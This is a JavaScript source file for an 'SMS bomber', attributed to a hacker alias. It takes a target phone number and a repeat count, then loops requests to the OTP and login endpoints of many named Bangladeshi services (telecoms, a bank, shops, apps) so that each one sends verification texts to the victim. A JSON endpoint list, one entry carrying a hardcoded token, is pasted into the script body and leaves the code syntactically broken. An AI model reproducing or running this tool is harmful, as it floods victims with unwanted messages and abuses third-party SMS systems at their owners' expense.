// Author: Shayer Mahmud Sowmik [ Ign0r3dH4x0r ]
// Removing credit won't make you a cool programmer xD

$(document).ready(() => {

    $(document).on('click', '#send', function (e) {
        e.preventDefault();
        $('#logs').addClass('visually-hidden');
        var amount = $("#amount").val();
        var mobile = $("#mobile").val().replace(/^0/, "");
        if (amount > 0 && mobile.length == 10) {
            var c = 0;

            // Example of variable based api list , if you use this, comment out the fetch method
            // const APIS = [
            //     {
            //         method: "POST",
            //         url: `http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-${mobile}/operator-Robi/send`,
            //     },
            //     {
            //         method: 'POST',
            //         url: "http://robi.api.bongobd.com/api/login/send-otp",
            //         body: `msisdn=88${mobile}&operator=all`
            //     },
            //     {
            //         method: 'GET',
            //         url: `http://45.114.85.19:8080/v3/otp/send?msisdn=88${mobile}`
            //     },
            //     {
            //         method: 'GET',
            //         url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
            //     },
            //     {
            //         url: "https://ss.binge.buzz/otp/send/login",
            //         method: "POST",
            //         body: `phone=${mobile}`
            //     }

            // ];
            // while (c < amount) {
            //     APIS.forEach(API => {
            //         $.ajax(API);
            //         c += 1;
            //     });
            // }

            // $('#logs').removeClass('visually-hidden');
            // $('#logs').text("Processing Bombing Request...");


            


[

    {

        "id": "1",

        "name": "GP",

        "url": "https:\/\/api.mygp.cinematic.mobi\/api\/v1\/otp\/88*****\/SBENT_3GB7D",

        "method": "post",

        "body": "",

        "headers": {

            "content-type": "application\/json"

        }

    },

    {

        "id": "2",

        "name": "Tap",

        "url": "https:\/\/api.bdkepler.com\/api_middleware-0.0.1-RELEASE\/registration-generate-otp",

        "method": "post",

        "body": "{\"deviceId\":\"7dtdhid45c0f5678\",\"deviceInfo\":{\"deviceInfoSignature\":\"D0923F3GDHJXJDTIHFDTIGGHURHFATGHIYAGTAJ\",\"deviceId\":\"7d8b0agi0g0f0568\",\"firebaseDeviceToken\":\"\",\"manufacturer\":\"MI\",\"modelName\":\"NOTE 10\",\"osFirmWireBuild\":\"\",\"osName\":\"Android\",\"osVersion\":\"10\",\"rootDevice\":0},\"operator\":\"Gp\",\"walletNumber\":\"*****\"}",

        "headers": {

            "content-type": "application\/json"

        }

    },


    {

        "id": "3",

        "name": "GP",

        "url": "https:\/\/weblogin.grameenphone.com\/backend\/api\/v1\/otp",

        "method": "post",

        "body": "{\"msisdn\":\"*****\"}",

        "headers": {

            "content-type": "application\/json"

        }

    },

    {

        "id": "4",

        "name": "Arogga",

        "url": "https:\/\/api.arogga.com\/v1\/auth\/sms\/send",

        "method": "post",

        "body": "mobile=%2B88*****&fcmToken=&referral=",

        "headers": {

            "content-type": "application\/x-www-form-urlencoded"

        }

    },

    {

        "id": "5",

        "name": "Gp Flexi Plan",

        "url": "https:\/\/gpwebms.grameenphone.com\/api\/v1\/flexiplan-purchase\/activation",

        "method": "post",

        "body": "{\"payment_mode\":\"mobile_balance\",\"longevity\":7,\"voice\":25,\"data\":1536,\"fourg\":0,\"bioscope\":0,\"sms\":0,\"mca\":0,\"msisdn\":\"*****\",\"price\":93.52,\"bundle_id\":17130,\"is_login\":false}",

        "headers": {

            "content-type": "application\/json"

        }

    },


    {

        "id": "6",

        "name": "Ecuriar",

        "url": "https:\/\/backoffice.ecourier.com.bd\/api\/web\/individual-send-otp?mobile=*****",

        "method": "get",

        "body": "",

        "headers": {

            "content-type": "application\/x-www-form-urlencoded"

        }

    },


    {

        "id": "7",

        "name": "Chaina",

        "url": "https:\/\/chinaonlineapi.com\/api\/v1\/get\/otp?phone=*****",

        "method": "get",

        "body": "",

        "headers": {

            "content-type": "application\/x-www-form-urlencoded",

            "token": "gwkne73882b40gwgkef5150e91759f7a1282303230000000001utnhjglowjhmfl2585gfkiugmwp56092219"

        }

    },

    {

        "id": "8",

        "name": "Iqra",

        "url": "http:\/\/apibeta.iqra-live.com\/api\/v1\/sent-otp\/*****",

        "method": "get",

        "body": "",

        "headers": {

            "content-type": "application\/x-www-form-urlencoded"

        }

    },

    {

        "id": "18",

        "name": "Sikho",

        "url": "https:\/\/api.shikho.com\/auth\/v2\/send\/sms",

        "method": "post",

        "body": "{\"phone\":\"*****\",\"type\":\"student\",\"auth_type\":\"signup\",\"vendor\":\"shikho\"}",

        "headers": {

            "content-type": "application\/json"

        }

    },

    {

        "id": "9",

        "name": "Qcom",

        "url": "https:\/\/auth.qcoom.com\/api\/v1\/otp\/send",

        "method": "post",

        "body": "{\"mobileNumber\":\"+88*****\"}",

        "headers": {

            "content-type": "application\/json",

            "Referer": "https:\/\/qcoom.com"

        }

    },

    {

        "id": "10",

        "name": "Circel",

        "url": "https:\/\/circle.robi.com.bd\/mylife\/gateway\/register_fcm.php?regId&msisdn=88*****",

        "method": "get",

        "body": "",

        "headers": {

            "content-type": "application\/x-www-form-urlencoded"

        }

    },

    {

        "id": "11",

        "name": "Cinespot",

        "url": "http:\/\/www.cinespot.mobi\/api\/cinespot\/v1\/otp\/sms\/mobile-*****\/operator-Robi\/send",

        "method": "get",

        "body": "",

        "headers": {

            "content-type": "application\/x-www-form-urlencoded"

        }

    },

    {

        "id": "12",

        "name": "Dhaka",

        "url": "https:\/\/ezybank.dhakabank.com.bd\/VerifIDExt2\/api\/CustOnBoarding\/VerifyMobileNumber",

        "method": "post",

        "body": "{ \"AccessToken\": \"\", \"TrackingNo\": \"\", \"mobileNo\": \"*****\", \"otpSms\": \"\", \"product_id\": \"250\", \"requestChannel\": \"MOB\", \"trackingStatus\": 5 }",

        "headers": {

            "content-type": "application\/json"

        }

    },

    {

        "id": "13",

        "name": "Applink",

        "url": "https:\/\/applink.com.bd\/appstore-v4-server\/login\/otp\/request",

        "method": "post",

        "body": "{\"msisdn\":\"88*****\"}",

        "headers": {

            "content-type": "application\/json"

        }

    },

    {

        "id": "14",

        "name": "Quizgiri",

        "url": "https:\/\/developer.quizgiri.xyz\/api\/v2.0\/send-otp",

        "method": "post",

        "body": "{\"phone\":\"*****\",\"country_code\":\"+880\",\"fcm_token\":null}",

        "headers": {

            "content-type": "application\/json"

        }

    },

    {

        "id": "15",

        "name": "Sadhin Music",

        "url": "https:\/\/shadhinapp.com\/v3\/api\/sms",

        "method": "post",

        "body": "{\"phone\":\"*****\"}",

        "headers": {

            "content-type": "application\/json"

        }

    },

   
    {

        "id": "16",

        "name": "Chardike",

        "url": "https:\/\/api.chardike.com\/api\/otp\/send",

        "method": "post",

        "body": "{\"phone\":\"*****\",\"otp_type\":\"login\"}",

        "headers": {

            "content-type": "application\/json"

        }

    },
  
 }

]

            
            fetch("/assets/apis.json")
                .then(r => r.json())
                .then(r => {
                    const APIS = r.apis;
                    console.log(APIS);
                    while (c < amount) {
                        APIS.forEach(API => {
                            config = {
                                url: API.url.replace("*****", mobile),
                                method: API.method,
                                headers: API.headers,
                                body: API.body.replace("*****", mobile)
                            }
                            $.ajax(config);
                            c += 1;
                        });
                    }
    
                    $('#logs').removeClass('visually-hidden');
                    $('#logs').text("Processing Bombing Request...");
                }).catch(error => console.error('Error', error))


        } else {
            $('#logs').removeClass('visually-hidden');
            $('#logs').text("Invalid Number or Amount is null");
        }
    });
})
